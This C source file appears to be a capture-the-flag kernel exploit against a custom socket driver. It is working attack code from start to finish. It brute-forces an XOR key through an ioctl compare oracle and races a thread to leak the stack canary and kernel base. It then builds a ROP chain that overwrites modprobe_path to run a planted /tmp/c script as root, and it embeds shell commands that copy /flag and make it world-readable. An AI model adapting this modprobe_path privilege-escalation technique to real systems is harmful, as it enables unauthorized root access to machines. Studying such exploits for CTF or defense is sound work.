#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#define MAGIC_FAM 0xf

#define SET_SIZE 0x13371001
#define COMPARE 0x13371002

int fd;
char payload[0x1000];
char magic_key[256];

struct Request {
    unsigned long sub_command;
    unsigned long buffer_size;
    char *buffer;
};

unsigned long send_compare_req(int fd, unsigned long sub_command, unsigned long buffer_size, char* buffer) {
    struct Request req = {
        .sub_command = sub_command,
        .buffer_size = buffer_size,
        .buffer = buffer
    };

    return ioctl(fd, COMPARE, &req);
}

void read_magic_key(int fd) {
    for(int i=0; i<256; i++) {
        for(int ch=0; ch<=0xff; ch++) {
            magic_key[i] = (char)ch;

            int res = send_compare_req(fd, 0x1338, i+1, &magic_key);

            if(res>0) {
                break;
            }
        }
    }
}

int run_size_overwrite = 1;

void thread_overwrite_size(void *args) {
    // keep overwriting device buffer size with 0x200
    while(run_size_overwrite == 1) {
        ioctl(fd, SET_SIZE, 0x200);        
    }
}

void encrypt_buffer(char *buffer) {
    for(int i=0; i<256; i++)
        buffer[i] ^= magic_key[i];    
}

void leak_kernel(int fd, char *buffer) {
    // create buffer which will be encrypted to 0x0 bytes
    memset(buffer, 0, 0x200);
    encrypt_buffer(buffer);

    // create buffer for comparing to encrypted device buffer
    char comparer[0x200];
    memset(comparer, 0, 0x200);

    for(int i=0; i<0x18; i++) {
        for(int ch=0; ch<0x256; ch++) {
            // set compare byte
            buffer[0x100+i] = (char)ch;
            comparer[0x100+i] = (char)ch;

            // encrypt oversized buffer into device buffer
            int sockres = 0;
            while (sockres != 0x200) {                
                sockres = setsockopt(fd, 0, 0xdeadbeef, buffer, 0x0);
            }

            // send compare request
            int res = send_compare_req(fd, 0x1337, 0x100+i+1, &comparer);

            // check if we found a valid byte
            if (res > 0)
                break;
        }
    }
}

int main() {
    char buffer[0x200];

    system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/c");
    system("chmod +x /tmp/c");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

	fd = socket(MAGIC_FAM, SOCK_RAW, 0x100);

    printf("[+] Leak magic key\n");
	read_magic_key(fd);

    printf("[+] Start size overwrite thread\n");
    pthread_t thread_id;
    pthread_create(&thread_id, NULL, thread_overwrite_size, NULL);

    printf("[+] Leak kernel addresses\n");
    leak_kernel(fd, &buffer);

    run_size_overwrite = 0;
    
    unsigned long canary = *(unsigned long*)(buffer + 0x100);
    unsigned long module = *(unsigned long*)(buffer + 0x108);
    unsigned long kernel = *(unsigned long*)(buffer + 0x110);
    unsigned long kbase = kernel - 0x902b1d;

    printf("CANARY      : %p\n", canary);
    printf("MODULE      : %p\n", module);
    printf("KERNEL      : %p\n", kernel);
    printf("KERNEL BASE : %p\n", kbase);

    // mov qword ptr [rdi], rsi; ret;
    unsigned long movrdirsi = kbase + 0x1f50d6;
    unsigned long poprdi = kbase + 0x8cbc0;
    unsigned long poprsi = kbase + 0x33a7de;
    unsigned long modprobe_path = kbase + 0x165ecc0;

    unsigned long* ptr = (unsigned long*) (payload+0x100);

    (*ptr++) = canary;

    ptr = (unsigned long*)(payload+272);

    (*ptr++) = poprdi;
    (*ptr++) = modprobe_path;
    (*ptr++) = poprsi;
    (*ptr++) = 0x0000632f706d742f;      // /tmp/c
    (*ptr++) = movrdirsi;

    // send compare request to trigger stack overflow
    send_compare_req(fd, 0x1338, 0x180, &payload);

    getchar();

	close(fd);
}